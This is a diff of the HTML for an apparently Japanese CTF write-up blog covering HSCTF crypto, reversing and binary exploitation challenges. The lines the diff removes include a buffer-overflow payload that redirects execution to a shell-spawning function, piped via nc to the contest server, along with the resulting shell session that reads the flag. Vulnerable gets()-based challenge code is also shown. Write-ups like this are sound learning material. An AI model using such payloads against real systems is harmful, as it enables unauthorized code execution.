+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x09</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x05</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x08</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x15</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x06</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x1D</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x1B</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x04</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0D</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0A</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x1A</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x16</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x17</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x1C</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x14</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x01</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x11</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x00</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x13</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x18</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0B</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x19</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x10</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x03</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x12</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0F</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x02</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0C</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x07</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0E</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
+                  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x1E</span> <span class="o">&amp;</span> <span class="mh">0x3</span> <span class="o">|</span> <span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x00</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">]</span>
+		  <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="sc">&#39;</span><span class="sc">\n</span><span class="sc">&#39;</span><span class="p">;</span>
     <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div>
-<h2 id="not-solved-1">(Not solved)</h2>
-
+</div><h2 id="not-solved1">(Not solved)</h2>
 <p>なんとなく方向性はわかった気がしたんですが、解けませんでした。。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 mt19937 疑似乱数は連続した624個の結果があると、その次に出てくる乱数が予測できます。
-<br /><br />
-以下にツールがあります。<br />
-<a href="https://github.com/eboda/mersenne-twister-recover">https://github.com/eboda/mersenne-twister-recover</a>
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
+以下にツールがあります。<!-- raw HTML omitted -->
+<a href="https://github.com/eboda/mersenne-twister-recover"><a href="https://github.com/eboda/mersenne-twister-recover">https://github.com/eboda/mersenne-twister-recover</a></a>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 与えられたC++のコード（上記）で、216回ループしている中で3回ずつrandom()が呼ばれるので、合計648回（&gt; 624）。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 ビットシフトしているやつを逆にシフトしなおせばv1, v2, v3は求められると思いきや、一番最初と最後でORされちゃっているビットがあって、値が確定できません。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 問題が間違っているかと思って問い合わせをしてみたんですが、返事もないし、実際解いている人が何人かいたので、なんかしら解き方があるようです。。</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="reverse-search-algorithm-cryptography">Reverse Search Algorithm (Cryptography)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>WWPHSN students, gotta get these points to boost your grade.
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
-<br />
+<!-- raw HTML omitted -->
 e = 65537
-<br />
+<!-- raw HTML omitted -->
 c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777</p>
 </blockquote>
-
-<h2 id="solution-5">Solution</h2>
-
+<h2 id="solution5">Solution</h2>
 <p>SECCON Beginners CTF 2018 で出た「RSA is Power」とほぼ同じ問題のようです。</p>
-
 <p>以下のWriteupを参考にさせてもらいました。
-<br />
-<a href="https://graneed.hatenablog.com/entry/2018/05/27/183004">https://graneed.hatenablog.com/entry/2018/05/27/183004</a></p>
-
+<!-- raw HTML omitted -->
+<a href="https://graneed.hatenablog.com/entry/2018/05/27/183004"><a href="https://graneed.hatenablog.com/entry/2018/05/27/183004">https://graneed.hatenablog.com/entry/2018/05/27/183004</a></a></p>
 <p>nを素因数分解してpとqを求め、
-<br />
+<!-- raw HTML omitted -->
 <a href="http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137">http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137</a></p>
-
 <p>pythonでゴニョゴニョっとやります。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -919,36 +832,28 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
 <span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
 <span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">x</span><span class="s1">&#39;</span><span class="p">)</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">utf-8</span><span class="s1">&#39;</span><span class="p">)</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>hsctf{y3s_rsa_1s_s0lved_10823704961253}</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+</div><p>hsctf{y3s_rsa_1s_s0lved_10823704961253}</p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="a-byte-reversal">A Byte (Reversal)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Just one byte makes all the difference.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>a-byte</li>
 </ul>
-
-<h2 id="solution-6">Solution</h2>
-
+<h2 id="solution6">Solution</h2>
 <p>ghidraでde-compileすると、FUN_0010073a()のところで、以下の部分が見つかります。
-<br />
+<!-- raw HTML omitted -->
 （以下、抜粋です。）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1004,17 +909,17 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">iParm1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">__s</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">lParm2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
-    <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar3</span> <span class="o">==</span> <span class="mh">0x23</span><span class="p">)</span> <span class="p">{</span>
+<pre class="chroma"><code class="language-c" data-lang="c">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="p">(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iParm1</span> <span class="o">=</span><span class="o">=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">__s</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="o">*</span><span class="p">)</span><span class="p">(</span><span class="n">lParm2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span><span class="p">;</span>
+    <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s</span><span class="p">)</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar3</span> <span class="o">=</span><span class="o">=</span> <span class="mh">0x23</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
       <span class="k">while</span> <span class="p">(</span><span class="n">local_48</span> <span class="o">&lt;</span> <span class="mh">0x23</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">__s</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_48</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_48</span><span class="p">]</span> <span class="o">^</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">__s</span><span class="p">[</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_48</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">[</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_48</span><span class="p">]</span> <span class="o">^</span> <span class="mi">1</span><span class="p">;</span>
         <span class="n">local_48</span> <span class="o">=</span> <span class="n">local_48</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
       <span class="p">}</span>
-      <span class="n">local_38</span> <span class="o">=</span> <span class="sc">&#39;i&#39;</span><span class="p">;</span>
+      <span class="n">local_38</span> <span class="o">=</span> <span class="sa"></span><span class="sc">&#39;</span><span class="sc">i</span><span class="sc">&#39;</span><span class="p">;</span>
       <span class="n">local_37</span> <span class="o">=</span> <span class="mh">0x72</span><span class="p">;</span>
       <span class="n">local_36</span> <span class="o">=</span> <span class="mh">0x62</span><span class="p">;</span>
       <span class="n">local_35</span> <span class="o">=</span> <span class="mh">0x75</span><span class="p">;</span>
@@ -1050,95 +955,60 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
       <span class="n">local_17</span> <span class="o">=</span> <span class="mh">0x38</span><span class="p">;</span>
       <span class="n">local_16</span> <span class="o">=</span> <span class="mh">0x7c</span><span class="p">;</span>
       <span class="n">local_15</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="n">__s</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Oof, ur too good&#34;</span><span class="p">);</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="n">__s</span><span class="p">)</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">=</span><span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;</span><span class="s">Oof, ur too good</span><span class="s">&#34;</span><span class="p">)</span><span class="p">;</span>
         <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="k">goto</span> <span class="n">LAB_00100891</span><span class="p">;</span>
       <span class="p">}</span>
     <span class="p">}</span>
-  <span class="p">}</span></code></pre></td></tr></table>
+  <span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>1でXORしてるので、実際にやってみます。
-<pre>
-$ python
-&gt;&gt;&gt; ord(&lsquo;i&rsquo;)
-105
-&gt;&gt;&gt; chr(105^1)
-&lsquo;h&rsquo;
-&gt;&gt;&gt; chr(0x72^1)
-&rsquo;s&rsquo;
-</pre>
-フラグの先頭<code>hs</code>が見えましたね。残りも処理してフラグゲットです。
-<br /><br />
+</div><p>1でXORしてるので、実際にやってみます。</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>フラグの先頭<code>hs</code>が見えましたね。残りも処理してフラグゲットです。
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="return-to-sender-binary-exploitation">Return to Sender (Binary Exploitation)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Who knew the USPS could lose a letter so many times?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>return-to-sender</li>
 <li>return-to-sender.c</li>
 </ul>
-
-<h2 id="solution-7">Solution</h2>
-
+<h2 id="solution7">Solution</h2>
 <p>バッファオーバーフローの問題です。EIPが奪えるので、オフセット20バイトの後に、<code>system(&quot;/bin/sh&quot;);</code>を呼んでいる<code>win()</code>のアドレス<code>0x080491b6</code>を設定するだけです。
-<br /><br />
-<pre>
-# (python -c &lsquo;print(&ldquo;AAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08&rdquo;)&lsquo;; cat) | nc pwn.hsctf.com 1234
-Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA? it goes!</p>
-
-<p>ls
-bin
-dev
-flag
-lib
-lib32
-lib64
-return-to-sender
-return-to-sender.c
-cat flag
-hsctf{fedex_dont_fail_me_now}
-</pre></p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="combo-chain-lite-binary-exploitation">Combo Chain Lite (Binary Exploitation)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Training wheels!
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 nc pwn.hsctf.com 3131
-<br /><br />
-Note: If you&rsquo;re trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: <code>(python; cat -) | nc pwn.hsctf.com &lt;port&gt;</code>
-<br /><br />
-Hint: What&rsquo;s a ROP?</p>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
+Note: If you're trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: <code>(python; cat -) | nc pwn.hsctf.com &lt;port&gt;</code>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
+Hint: What's a ROP?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>combo-chain-lite</li>
 <li>combo-chain-lite.c</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1159,58 +1029,36 @@ Hint: What&rsquo;s a ROP?</p>
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
-	<span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Here&#39;s your free computer: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">system</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Dude you hear about that new game called /bin/sh&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;? Enter the right combo for some COMBO CARNAGE!: &#34;</span><span class="p">);</span>
-	<span class="n">gets</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;</span><span class="s">Here&#39;s your free computer: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;</span><span class="s">Dude you hear about that new game called /bin/sh</span><span class="s">&#34;</span><span class="p">)</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;</span><span class="s">? Enter the right combo for some COMBO CARNAGE!: </span><span class="s">&#34;</span><span class="p">)</span><span class="p">;</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">dest</span><span class="p">)</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
-	<span class="n">vuln</span><span class="p">();</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span><span class="p">;</span>
+	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
+	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">)</span><span class="p">;</span>
